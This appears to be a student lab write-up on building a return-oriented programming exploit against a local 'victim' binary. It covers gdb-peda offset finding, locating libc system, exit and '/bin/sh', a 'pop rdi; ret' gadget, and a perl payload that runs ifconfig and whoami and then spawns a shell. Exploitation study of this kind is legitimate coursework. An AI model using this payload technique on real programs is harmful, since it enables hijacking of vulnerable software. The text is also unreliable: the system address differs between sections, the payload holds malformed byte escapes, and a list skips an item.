# Return Oriented Programming

## Logistics

1. libc system address: **0x2aaaaad16590**

2. libc exit address: **0x2aaaaad0c1e0**

3. "/bin/sh" address: **0x2aaaaae50543**

4. white space in hex representation is
 **x20**

### Find the offset from buff to RET

We need to understand how many bytes of junk do we have to fill before getting to the return address of `foo`.

We use gdb-peda for this purpose:

```
gdb-peda$ pattern create 400 ptn.txt
gdb-peda$ r < ptn.txt
gdb-peda$ x/s $rsp
0x7fffffffe538:	"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAP\006@"
gdb-peda$ pattern offset AcAA2AAHAAdA
AcAA2AAHAAdA found at offset: 56
```

The distance we need to fill up is 56 bytes.

### Interesting way to find "system" in libc

Here is an alternative way to find `system` in libc without the help of gdb.

Use `ldd` to find the shared library dependencies.

```bash
$ ldd victim
```

gives us
```bash
libc.so.6 =>/lib/x86_64-linux-gnu/libc.so.6(0x00007ffff7c29000)
```

Then we search for the 'system' symbol in the file:

```
$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
0000000000046590 W system
```

Therefore the offset of 'system' symbol in libc is 0x0000000000046590, and by using 'i proc mapping' we get to konw the starting address of libc is **0x2aaaaacd0000**.

Hence the address is:

```
0x2aaaaacd0000 + 0x0000000000046590 = 0x2aaaaad16590
```

### Other Payloads

We know that "ifconfig" and "whoami" must be loaded into environment beforehand. So we would need white space sled for both of them.

Add the following lines into ~/.profile:

```bash
export ROP1=$(perl -e 'print "\x20"x100, "ifconfig"')
export ROP2=$(perl -e 'print "\x20"x100, "whoami"')
```

Again, using GDB we get to know there address:

ifconfig: **0x7fffffffee13**
whoami: **0x7fffffffeeab**

## Find ROP gadgets

`system` takes in rdi as its argument, hence we would be looking for some gadgets such that it pops the stack into rdi, and returns.

Running ropper, we found such gadget:

```bash
$ ropper -f victim | grep rdi
0x00000000004006b3: pop rdi; ret;
```

## Construct ROP Chain

We would like to do the following tasks in sequence:

```
1. Load the address of "ifconfig" from stack into rdi;
2. Return to "system";
3. Load the address of "whoami" from stack into rdi;
4. Return to "system";
5. Load the address of "/bin/sh" from stack into rdi;
6. Return to "system";
7. Load some random value into rdi;
8. Return to "exit";
```

We know the following:

1. ROP gadget address:  0x00000000004006b3
2. system address:      0x00007ffff7a57590
3. exit address:        0x00007ffff7a4d1e0
4. /bin/sh address:     0x00002aaaaae50543
5. ifconfig address:    0x00007fffffffee13
7. whoami address:      0x00007fffffffeeab

Our payload would therefore be:

```
perl -e 'print "A"x56, "\xb3\x6\x40\x0", "\x0\x0\x0\x0", "\x13\xee\xff\xff", "\xff\x7f\x0\x0", "\x90\x75\xa5\xf7", "\ff\7fa\x0\x0", "\xb3\x6\x40\x0", "\x0\x0\x0\x0", "\xab\xee\xff\xff", "\xff\x7f\x0\x0", "\x90\x75\xa5\xf7", "\xffx7f\x0\x0", "\xb3\x6\x40\x0", "\x0\x0\x0\x0", "\x43\x5\xe5\xaa", "\xaa\x2a\x0\x0", "\x90\x75\xa5\xf7", "\ff\7fa\x0\x0", "\xe0\xd1\xa4\xf7", "\xff\x7f\x0\x0"'
```